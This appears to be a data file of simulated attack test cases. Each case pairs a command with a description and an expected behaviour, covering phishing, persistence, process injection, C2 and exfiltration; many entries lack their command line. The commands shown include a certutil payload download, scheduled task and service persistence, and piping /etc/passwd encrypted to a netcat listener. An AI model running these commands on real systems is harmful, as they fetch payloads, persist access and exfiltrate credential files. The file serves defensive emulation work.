attacks.command:
powershell -Command "New-Item -Path '$env:TEMP\phish_email.txt' -ItemType File -Force; Set-Content -Path '$env:TEMP\phish_email.txt' -Value 'Subject: Urgent Action Required

Dear User,
Please click the link below to verify your account:
http://example.com

Best Regards,
Your Company' -Force"
attacks.description: Creates a benign phishing email text file in the temporary directory.
attacks.expected_behavior: Generates a file named 'phish_email.txt' containing a simulated phishing email in the temporary directory.

attacks.command: certutil -urlcache -f http://example.com/evil.exe '$env:TEMP\evil.exe' && echo 'Downloaded simulated malicious file' > '$env:TEMP\download_log.txt'
attacks.description: Simulates downloading a malicious file using certutil, without actual internet access.
attacks.expected_behavior: Attempts to download a file from a URL, logging the action to a text file. No actual download occurs due to lack of internet access.

attacks.command: powershell -Command "Start-Process 'cmd.exe' -ArgumentList '/c echo Simulated phishing link execution > '$env:TEMP\phish_log.txt''"
attacks.description: Simulates executing a phishing link by logging the action in a text file.
attacks.expected_behavior: Creates a log entry in 'phish_log.txt' indicating a simulated phishing link execution.

attacks.command: echo 'Phishing Simulation: Click the link' | mail -s 'Test Email' user@example.com
attacks.description: Basic command to simulate sending a phishing email using the mail command.
attacks.expected_behavior: Sends a test email with a phishing simulation message. No real phishing payload is included.

attacks.command: echo 'Visit http://example.com for a surprise!' | mail -s 'Surprise' user@example.com
attacks.description: Intermediate command simulating a more realistic phishing email with a URL.
attacks.expected_behavior: Sends a test email with a URL, simulating a phishing attempt. No actual malicious content is delivered.

attacks.command: echo 'Encoded Phishing Simulation: ' $(echo -n 'Visit http://example.com' | base64) | mail -s 'Encoded Message' user@example.com
attacks.description: Advanced command using base64 encoding to simulate a more complex phishing email.
attacks.expected_behavior: Sends a test email with a base64 encoded message, simulating a phishing attempt. The message is benign and decodes to a simple URL.

attacks.description: Creates a scheduled task to run a PowerShell command that outputs 'Hello World'.
attacks.expected_behavior: A new scheduled task named 'TestTask' is created, which runs a PowerShell command once at midnight.

attacks.command: sc create TestService binPath= "cmd.exe /c echo Hello World" start= auto
attacks.description: Creates a Windows service that executes a command to display 'Hello World'.
attacks.expected_behavior: A new service named 'TestService' is created, which runs a command to display 'Hello World' when started.

attacks.command: powershell -Command "New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Write-Output 'Hello World'"'; New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Write-Output ''Hello World''"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName 'TestTask' -Description 'Test Task'"
attacks.description: Creates a scheduled task using PowerShell to run a command that outputs 'Hello World' at startup.
attacks.expected_behavior: A new scheduled task named 'TestTask' is created, which runs a PowerShell command at system startup to output 'Hello World'.

attacks.description: Creates a simple bash script in /tmp, makes it executable, and runs it in the background.
attacks.expected_behavior: The command creates a benign script that outputs 'Test Process' and runs it in the background.

attacks.command:
sudo systemctl enable --now test_service && echo '#!/bin/bash
echo "Test Service Running"' | sudo tee /etc/systemd/system/test_service.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl start test_service
attacks.description: Creates a new systemd service that runs a simple script and starts it.
attacks.expected_behavior: The command creates and starts a systemd service that outputs 'Test Service Running'.

attacks.description: Creates a cron job that writes to a log file every minute.
attacks.expected_behavior: The command sets up a cron job that appends 'Cron Test' to /tmp/cron_test.log every minute.

attacks.description: Basic process injection using certutil.exe to decode and execute a PowerShell script.
attacks.expected_behavior: Decodes a benign PowerShell script from a text file and executes it.

attacks.description: Intermediate process injection using Invoke-Command to start a new process with a PowerShell script block.
attacks.expected_behavior: Executes a script block that starts a new PowerShell process with a benign command.

attacks.description: Advanced process injection using Start-Process with an encoded command.
attacks.expected_behavior: Decodes a Base64 command and executes it in a new PowerShell process with elevated privileges.

attacks.description: Basic process injection using LD_PRELOAD to load a benign shared library before executing a command.
attacks.expected_behavior: The /bin/ls command will execute with the benign shared library preloaded, demonstrating process injection.

attacks.description: Intermediate process injection using gdb to inject a benign function call into a running process.
attacks.expected_behavior: The gdb debugger will inject a benign function call into the running ls process, demonstrating process injection.

attacks.description: Advanced process injection combining LD_PRELOAD and gdb to inject a benign shared library and function call into a running process.
attacks.expected_behavior: The gdb debugger will inject a benign function call into the running ls process with a benign shared library preloaded, demonstrating advanced process injection.

attacks.description: Basic command to simulate viewing a URL using net.exe, demonstrating application layer protocol activity.
attacks.expected_behavior: The command will attempt to view the URL using net.exe, which should be benign and safe.

attacks.description: Intermediate command to query the status of the HTTP service using sc.exe, simulating application layer protocol activity.
attacks.expected_behavior: The command will query the status of the HTTP service, which is non-destructive and safe.

attacks.description: Advanced command to manipulate the URL cache using certutil.exe, demonstrating application layer protocol activity.
attacks.expected_behavior: The command will manipulate the URL cache, which is safe but involves more complex operations.

attacks.description: Basic command to listen on port 4444 using netcat, simulating a simple C2 server.
attacks.expected_behavior: Netcat listens on port 4444 for incoming connections.

attacks.description: Intermediate command using curl to fetch and execute commands from a remote server.
attacks.expected_behavior: Curl fetches a file from a remote server and executes it.

attacks.description: Advanced command using socat to create a reverse shell, simulating a more sophisticated C2 channel.
attacks.expected_behavior: Socat listens on port 4444 and executes a bash shell upon connection.

attacks.description: Basic command to simulate data exfiltration by downloading a benign file to a temporary location using certutil.exe.
attacks.expected_behavior: Creates a file named test.txt in the %TEMP% directory with benign content.

attacks.description: Intermediate command using PowerShell to start a process that writes benign data to a temporary file.
attacks.expected_behavior: Creates a file named exfil.txt in the %TEMP% directory with the text 'Test data'.

attacks.description: Advanced command to encode data and write it to a temporary file using PowerShell.
attacks.expected_behavior: Creates a file named encoded.txt in the %TEMP% directory containing Base64 encoded text.

attacks.description: Basic example of exfiltrating data using netcat to a local port.
attacks.expected_behavior: The command sends 'test_data' to a netcat listener running on localhost at port 4444. No actual exfiltration occurs as it is directed locally.

attacks.description: Intermediate example using base64 encoding before exfiltration.
attacks.expected_behavior: The command encodes 'sample_data' in base64 and sends it to a local netcat listener on port 4444. This simulates a more realistic exfiltration scenario.

attacks.command: cat /etc/passwd | openssl enc -aes-256-cbc -a -salt -pass pass:password123 | nc localhost 4444 > /dev/null
attacks.description: Advanced example using OpenSSL to encrypt data before exfiltration.
attacks.expected_behavior: The command encrypts the contents of '/etc/passwd' using AES-256-CBC and sends it to a local netcat listener on port 4444. This demonstrates a more sophisticated exfiltration method.

attacks.description: Basic command to archive a file using PowerShell.
attacks.expected_behavior: Creates a zip archive named 'test.zip' in the TEMP directory containing 'test.txt'.

attacks.description: Intermediate command to collect system information using a legacy binary and archive it.
attacks.expected_behavior: Collects the current user information and encodes it into a binary file in the TEMP directory.

attacks.description: Advanced command to collect process information and archive it using PowerShell.
attacks.expected_behavior: Creates a text file listing all processes, archives it into a zip file, and then deletes the text file.

attacks.description: Basic command to create a compressed archive of a directory using tar.
attacks.expected_behavior: Creates a compressed archive 'data_archive.tar.gz' of the 'test_data' directory in the user's home directory.

attacks.description: Intermediate command to find files in a directory and archive them using tar with xargs.
attacks.expected_behavior: Finds all files in 'test_data' and archives them into 'data_archive.tar.gz' in the user's home directory.

attacks.command: find $env:HOME/test_data -type f -print0 | xargs -0 tar --use-compress-program=gzip -cf - | dd of=$env:HOME/data_archive.tar.gz
attacks.description: Advanced command using find, xargs, tar, and dd to archive files with custom compression.
attacks.expected_behavior: Archives files from 'test_data' using a custom compression pipeline and saves as 'data_archive.tar.gz' in the user's home directory.
